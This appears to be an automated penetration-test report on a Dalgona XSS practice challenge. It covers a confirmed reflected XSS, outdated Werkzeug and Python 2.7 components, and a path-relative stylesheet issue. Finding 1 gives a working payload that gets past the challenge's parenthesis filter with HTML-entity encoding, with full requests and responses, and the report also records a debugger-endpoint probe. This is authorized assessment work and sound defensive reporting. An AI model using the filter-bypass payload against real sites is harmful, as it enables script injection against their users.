# VERDICT Security Assessment Report

## Contents

- [Assessment Information](#assessment-information)
- [Scope](#scope)
- [Summary](#summary)
- [Findings](#findings)
    - [1. HIGH — xss-reflected Reflected XSS in `name` parameter via `<img src>` attribute injection](#finding-1)
    - [2. MEDIUM — vulnerable-component Outdated Werkzeug 1.0.1 (development server) — known DoS CVE-2023-25577](#finding-2)
    - [3. MEDIUM — vulnerable-component End-of-life Python 2.7.18 runtime — unsupported, unpatched (CVE-2021-3177, CVE-2021-23336)](#finding-3)
    - [4. INFO — burp Path-relative style sheet import (2 URLs)](#finding-4)

## Assessment Information

| | |
|---|---|
| Assessment ID | `a-mqyn688g-xmwuw9` |
| Target | http://target.local:32832/ |
| Started | 2026-06-29T03:12:02.867Z |
| Generated | 2026-07-02T00:00:00.000Z |
| Phase | report |
| Screens | 2 mapped · 2 scanned · 0 remaining |
| Hypotheses | 0 (0 confirmed) |
| Findings | 4 |
| Tooling | VERDICT |

## Scope

- **In-scope hosts**: `target.local:32832`
- **Out-of-scope hosts**: —
- **In-scope paths**: `/`
- **Out-of-scope paths**: —
- **Rate**: 30 req/min, max 2 concurrent

## Summary

4 finding(s): 1 high, 2 medium, 1 info

## Findings

<a id="finding-1"></a>

### 1. [HIGH] [xss-reflected] Reflected XSS in `name` parameter via `<img src>` attribute injection

- Screen: `s-0002`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32832/

The `name` GET parameter is injected verbatim into an `<img src="...">` attribute without HTML-escaping. A `"` in the value terminates the `src` attribute, enabling arbitrary event-handler injection. The server blocks literal `(` and backtick characters, but HTML-entity-encoded parentheses (`&#40;` / `&#41;`) are decoded by the browser at render time, bypassing the filter entirely. Confirmed by the server's own headless browser execution engine: the payload `" onerror=alert&#40;1&#41; x="` produced `alert(1)` execution (server responded "Oops! You did an alert with 1 instead of XSS").

**Reproduction**

```
1. GET /page?name=%22+onerror%3Dalert%26%2340%3B1%26%2341%3B+x%3D%22
   (decoded: name=" onerror=alert&#40;1&#41; x=")
2. Server reflects: <img src="" onerror=alert&#40;1&#41; x="">
3. Browser decodes &#40; → ( and &#41; → ) at render time; onerror fires alert(1).
Negative control: GET /page?name=hello → <img src="hello"> — no event handler, no execution.
```

**Evidence**

- Evidence `ev-mqynb05z-9` — `artifacts/s-0002/ev-mqynb05z-9/`

Request:

```http
GET /page?name=hello HTTP/1.1
Host: target.local:32832
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
content-length: 1001
content-type: text/html; charset=utf-8
date: Mon, 29 Jun 2026 03:15:45 GMT
server: Werkzeug/1.0.1 Python/2.7.18
x-xss-protection: 0


    <html>
        <head>
            <link rel="shortcut icon" href="static/assets/fav-icon.png">
            <link rel="stylesheet" type="text/css" href="static/css/style.css">
            <link rel="stylesheet" type="text/css" href="static/css/xss/xss20.css">
            <title>Dalgona - Star</title>
        </head>

        <article class="widget widget__login">
        <div class="widget__content">
            <div class="box">
                <form class="box-form">
                    <img class="text-img" src="static/img/logo5_white.png">
                    
                    <div class="solution-text"><img src="static/img/cookies/error_star.png" alt="Fail" width="150" height="150"><br>Oops! You did an alert with TypeError: Attempting to change the setter of an unconfigurable property. instead of "XSS"</div>
                    <input type=text name=name placeholder="Enter your name..." ><img src="hello">
                </form>
            </div>
        </div>
    </html>
```

- Evidence `ev-mqynds3p-j` — `artifacts/s-0002/ev-mqynds3p-j/`

Request:

```http
GET /page?name=%22+onerror%3Dalert%26%2340%3B1%26%2341%3B+x%3D%22 HTTP/1.1
Host: target.local:32832
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
content-length: 954
content-type: text/html; charset=utf-8
date: Mon, 29 Jun 2026 03:17:54 GMT
server: Werkzeug/1.0.1 Python/2.7.18
x-xss-protection: 0


    <html>
        <head>
            <link rel="shortcut icon" href="static/assets/fav-icon.png">
            <link rel="stylesheet" type="text/css" href="static/css/style.css">
            <link rel="stylesheet" type="text/css" href="static/css/xss/xss20.css">
            <title>Dalgona - Star</title>
        </head>

        <article class="widget widget__login">
        <div class="widget__content">
            <div class="box">
                <form class="box-form">
                    <img class="text-img" src="static/img/logo5_white.png">
                    
                    <div class="solution-text"><img src="static/img/cookies/error_star.png" alt="Fail" width="150" height="150"><br>Oops! You did an alert with 1 instead of "XSS"</div>
                    <input type=text name=name placeholder="Enter your name..." ><img src="" onerror=alert&#40;1&#41; x="">
                </form>
            </div>
        </div>
    </html>
```

- Evidence `ev-mqyngbjl-k` — `artifacts/s-0002/ev-mqyngbjl-k/`

Request:

```http
GET /page?name=%22+onerror%3Dalert%26%2340%3B1%26%2341%3B+x%3D%22 HTTP/1.1
Host: target.local:32832
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
content-length: 954
content-type: text/html; charset=utf-8
date: Mon, 29 Jun 2026 03:19:53 GMT
server: Werkzeug/1.0.1 Python/2.7.18
x-xss-protection: 0


    <html>
        <head>
            <link rel="shortcut icon" href="static/assets/fav-icon.png">
            <link rel="stylesheet" type="text/css" href="static/css/style.css">
            <link rel="stylesheet" type="text/css" href="static/css/xss/xss20.css">
            <title>Dalgona - Star</title>
        </head>

        <article class="widget widget__login">
        <div class="widget__content">
            <div class="box">
                <form class="box-form">
                    <img class="text-img" src="static/img/logo5_white.png">
                    
                    <div class="solution-text"><img src="static/img/cookies/error_star.png" alt="Fail" width="150" height="150"><br>Oops! You did an alert with 1 instead of "XSS"</div>
                    <input type=text name=name placeholder="Enter your name..." ><img src="" onerror=alert&#40;1&#41; x="">
                </form>
            </div>
        </div>
    </html>
```

<a id="finding-2"></a>

### 2. [MEDIUM] [vulnerable-component] Outdated Werkzeug 1.0.1 (development server) — known DoS CVE-2023-25577

- Screen: `(cross-screen)`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32832/

VERSION-BASED finding (matched by response banner, not exploited). Every response carries `Server: Werkzeug/1.0.1 Python/2.7.18`, identifying the Flask/Werkzeug WSGI dev server at version 1.0.1 (released 2020-04). Known issues affecting 1.0.1 (< 2.2.3): CVE-2023-25577 — denial of service via multipart/form-data parsing of an unbounded number of parts/fields (CVSS 7.5); CVE-2023-23934 — "nameless" cookie may be misinterpreted by browsers leading to cookie confusion (low). Separately, the banner indicates the built-in **Werkzeug development server**, which the project docs explicitly state must NOT be used in production (single-threaded, not hardened). NOTE: I actively probed the interactive debugger (`?__debugger__=yes&cmd=resource&f=debugger.js`) — it returned the normal index page, so the evalex console is OFF; CVE-2024-34069 (debugger RCE) is therefore NOT applicable here. Operator should confirm the multipart DoS exposure before relying on it, and upgrade Werkzeug to >= 2.3.8 and front the app with a production WSGI server (gunicorn/uWSGI behind a reverse proxy).

[+] Also observed as "End-of-life Python 2.7.18 runtime — unpatched (CVE-2021-3177, CVE-2021-23336)".

**Reproduction**

```
1. GET http://target.local:32832/ → 200, response header `Server: Werkzeug/1.0.1 Python/2.7.18`, 1090-byte body (ev-mqynj0zi-w). 2. Repeat GET / → identical 200 / 1090-byte response, same Server banner (ev-mqynklsg-y) — stable/reproducible. 3. Negative control: GET /verdict-nonexistent-xyz-404 → 404, 232-byte body (ev-mqynkm28-z), distinguishable. 4. Debugger check: GET /?__debugger__=yes&cmd=resource&f=debugger.js returned index HTML (not debugger.js) → debugger disabled. Version 1.0.1 < 2.2.3 → affected by CVE-2023-25577.
```

**Evidence**

- Evidence `ev-mqynkm28-z` — `artifacts/_/ev-mqynkm28-z/`

Request:

```http
GET /verdict-nonexistent-xyz-404 HTTP/1.1
Host: target.local:32832
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 404
content-length: 232
content-type: text/html; charset=utf-8
date: Mon, 29 Jun 2026 03:23:13 GMT
server: Werkzeug/1.0.1 Python/2.7.18

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>404 Not Found</title>
<h1>Not Found</h1>
<p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
```

- Evidence `ev-mqynj0zi-w` — `artifacts/_/ev-mqynj0zi-w/`

Request:

```http
GET / HTTP/1.1
Host: target.local:32832
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
content-length: 1090
content-type: text/html; charset=utf-8
date: Mon, 29 Jun 2026 03:21:59 GMT
server: Werkzeug/1.0.1 Python/2.7.18


    	<html>
        <head>
            <link rel="shortcut icon" href="static/assets/fav-icon.png">
            <link rel="stylesheet" type="text/css" href="static/css/style.css">
            <link rel="stylesheet" type="text/css" href="static/css/xss/index.css">
            <title>Dalgona Challenges</title>
        </head>

	        <article class="widget widget__login">
	        <div class="widget__content">
	    		<div class="box">
	                <form class="box-form">
	                    <img class="text-img" src="static/img/logo5_white.png">
				        <h1>Dalgona Challenges</h1>
	                    <div class="init-table">
                            <div class="row">
                                <div class="column"><a class="text" type=text href="page"><img src="static/img/cookies/new_star.png" alt="Star" width="150" height="150">Page</a></div>
				            </div>
                        </br>
				        </div>
				        </br>
				        </br>
				        <p></p>
	                </form>
	                </br>
				</div>
	        </div>
	    </html>
```

- Evidence `ev-mqynklsg-y` — `artifacts/_/ev-mqynklsg-y/`

Request:

```http
GET / HTTP/1.1
Host: target.local:32832
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
content-length: 1090
content-type: text/html; charset=utf-8
date: Mon, 29 Jun 2026 03:23:13 GMT
server: Werkzeug/1.0.1 Python/2.7.18


    	<html>
        <head>
            <link rel="shortcut icon" href="static/assets/fav-icon.png">
            <link rel="stylesheet" type="text/css" href="static/css/style.css">
            <link rel="stylesheet" type="text/css" href="static/css/xss/index.css">
            <title>Dalgona Challenges</title>
        </head>

	        <article class="widget widget__login">
	        <div class="widget__content">
	    		<div class="box">
	                <form class="box-form">
	                    <img class="text-img" src="static/img/logo5_white.png">
				        <h1>Dalgona Challenges</h1>
	                    <div class="init-table">
                            <div class="row">
                                <div class="column"><a class="text" type=text href="page"><img src="static/img/cookies/new_star.png" alt="Star" width="150" height="150">Page</a></div>
				            </div>
                        </br>
				        </div>
				        </br>
				        </br>
				        <p></p>
	                </form>
	                </br>
				</div>
	        </div>
	    </html>
```

<a id="finding-3"></a>

### 3. [MEDIUM] [vulnerable-component] End-of-life Python 2.7.18 runtime — unsupported, unpatched (CVE-2021-3177, CVE-2021-23336)

- Screen: `(cross-screen)`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32832/

VERSION-BASED finding (matched by response banner, not exploited) — distinct component from the Werkzeug finding f-002. The `Server: Werkzeug/1.0.1 Python/2.7.18` header discloses the app runs on **Python 2.7.18**, the final Python 2.7 release. Python 2 reached End-of-Life on 2020-01-01 and receives NO further upstream security updates, so the runtime carries a growing set of stdlib CVEs that will never be officially patched — e.g. CVE-2021-3177 (ctypes `PyCArg_repr` stack buffer overflow → DoS / potential code execution), CVE-2021-23336 (`urllib.parse` web cache poisoning / parameter cloaking via `;`), CVE-2020-8492 (urllib basic-auth ReDoS), CVE-2019-20907 (tarfile infinite-loop DoS). Exploitability of any single CVE depends on how the app uses the affected module, so treat individual CVEs as needing verification; the durable, certain issue is the unsupported/unpatched runtime. Remediation: migrate to a supported Python 3.x (3.11+). Banner observed on every response.

**Reproduction**

```
1. GET http://target.local:32832/ → 200, `Server: Werkzeug/1.0.1 Python/2.7.18`, 1090-byte body (ev-mqynj0zi-w). 2. Repeat GET / → identical 200 / 1090-byte response, same banner (ev-mqynklsg-y) — stable/reproducible. 3. Negative control: GET /verdict-nonexistent-xyz-404 → 404, 232-byte body (ev-mqynkm28-z), distinguishable. Python 2.7.x is EOL since 2020-01-01; 2.7.18 is the terminal release with no security backports.
```

**Evidence**

- Evidence `ev-mqynkm28-z` — `artifacts/_/ev-mqynkm28-z/`

Request:

```http
GET /verdict-nonexistent-xyz-404 HTTP/1.1
Host: target.local:32832
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 404
content-length: 232
content-type: text/html; charset=utf-8
date: Mon, 29 Jun 2026 03:23:13 GMT
server: Werkzeug/1.0.1 Python/2.7.18

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>404 Not Found</title>
<h1>Not Found</h1>
<p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
```

- Evidence `ev-mqynj0zi-w` — `artifacts/_/ev-mqynj0zi-w/`

Request:

```http
GET / HTTP/1.1
Host: target.local:32832
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
content-length: 1090
content-type: text/html; charset=utf-8
date: Mon, 29 Jun 2026 03:21:59 GMT
server: Werkzeug/1.0.1 Python/2.7.18


    	<html>
        <head>
            <link rel="shortcut icon" href="static/assets/fav-icon.png">
            <link rel="stylesheet" type="text/css" href="static/css/style.css">
            <link rel="stylesheet" type="text/css" href="static/css/xss/index.css">
            <title>Dalgona Challenges</title>
        </head>

	        <article class="widget widget__login">
	        <div class="widget__content">
	    		<div class="box">
	                <form class="box-form">
	                    <img class="text-img" src="static/img/logo5_white.png">
				        <h1>Dalgona Challenges</h1>
	                    <div class="init-table">
                            <div class="row">
                                <div class="column"><a class="text" type=text href="page"><img src="static/img/cookies/new_star.png" alt="Star" width="150" height="150">Page</a></div>
				            </div>
                        </br>
				        </div>
				        </br>
				        </br>
				        <p></p>
	                </form>
	                </br>
				</div>
	        </div>
	    </html>
```

- Evidence `ev-mqynklsg-y` — `artifacts/_/ev-mqynklsg-y/`

Request:

```http
GET / HTTP/1.1
Host: target.local:32832
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
content-length: 1090
content-type: text/html; charset=utf-8
date: Mon, 29 Jun 2026 03:23:13 GMT
server: Werkzeug/1.0.1 Python/2.7.18


    	<html>
        <head>
            <link rel="shortcut icon" href="static/assets/fav-icon.png">
            <link rel="stylesheet" type="text/css" href="static/css/style.css">
            <link rel="stylesheet" type="text/css" href="static/css/xss/index.css">
            <title>Dalgona Challenges</title>
        </head>

	        <article class="widget widget__login">
	        <div class="widget__content">
	    		<div class="box">
	                <form class="box-form">
	                    <img class="text-img" src="static/img/logo5_white.png">
				        <h1>Dalgona Challenges</h1>
	                    <div class="init-table">
                            <div class="row">
                                <div class="column"><a class="text" type=text href="page"><img src="static/img/cookies/new_star.png" alt="Star" width="150" height="150">Page</a></div>
				            </div>
                        </br>
				        </div>
				        </br>
				        </br>
				        <p></p>
	                </form>
	                </br>
				</div>
	        </div>
	    </html>
```

<a id="finding-4"></a>

### 4. [INFO] [burp] Path-relative style sheet import (2 URLs)

- Screen: `(cross-screen)`
- Source: validator `burp`
- Scope basis: burp scan (in-scope)

The application may be vulnerable to path-relative style sheet import (PRSSI) attacks. The response contains a path-relative style sheet import, and so condition 1 for an exploitable vulnerability is present (see issue background). The response can also be made to render in a browser's quirks mode. The page does not contain a doctype directive, and so it will always be rendered in quirks mode. Further, the response does not prevent itself from being framed, so an attacker can frame the response within a page that they control, to force it to be rendered in quirks mode. (Note that this techniqu [+1 more URL(s): http://target.local:32832/page] @ http://target.local:32832/

**Reproduction**

```
Burp が検出。証拠に request/response(Cookie/Authorization は伏字)。
```

**Evidence**

- Evidence `ev-mqynpwuy-11` — `artifacts/_/ev-mqynpwuy-11/`

Request:

```http
GET / HTTP/1.1
Host: target.local:32832

GET / HTTP/1.1
Host: target.local:32832
Accept: */*
```

Response:

```http
HTTP/1.1 0

HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 1090
Server: Werkzeug/1.0.1 Python/2.7.18
Date: Mon, 29 Jun 2026 03:25:10 GMT


    	<html>
        <head>
            <link rel="shortcut icon" href="static/assets/fav-icon.png">
            <link rel="stylesheet" type="text/css" href="static/css/style.css">
            <link rel="stylesheet" type="text/css" href="static/css/xss/index.css">
            <title>Dalgona Challenges</title>
        </head>

	        <article class="widget widget__login">
	        <div class="widget__content">
	    		<div class="box">
	                <form class="box-form">
	                    <img class="text-img" src="static/img/logo5_white.png">
				        <h1>Dalgona Challenges</h1>
	                    <div class="init-table">
                            <div class="row">
                                <div class="column"><a class="text" type=text href="page"><img src="static/img/cookies/new_star.png" alt="Star" width="150" height="150">Page</a></div>
				            </div>
                        </br>
				        </div>
				        </br>
				        </br>
				        <p></p>
	                </form>
	                </br>
				</div>
	        </div>
	    </html>
```
